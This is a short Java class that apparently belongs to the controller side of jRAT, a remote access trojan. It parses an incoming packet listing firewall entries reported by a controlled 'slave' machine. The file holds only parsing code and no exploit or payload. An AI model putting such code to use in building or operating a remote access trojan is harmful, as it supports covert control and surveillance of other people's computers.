package io.jrat.client.packets.incoming;

import io.jrat.client.Firewall;
import io.jrat.client.Slave;

import java.io.DataInputStream;


public class Packet70InitFirewall extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		int len = dis.readInt();

		Firewall[] firewalls = new Firewall[len];

		for (int i = 0; i < len; i++) {
			firewalls[i] = new Firewall(slave.readLine());
		}

		slave.setFirewalls(firewalls);
	}

}
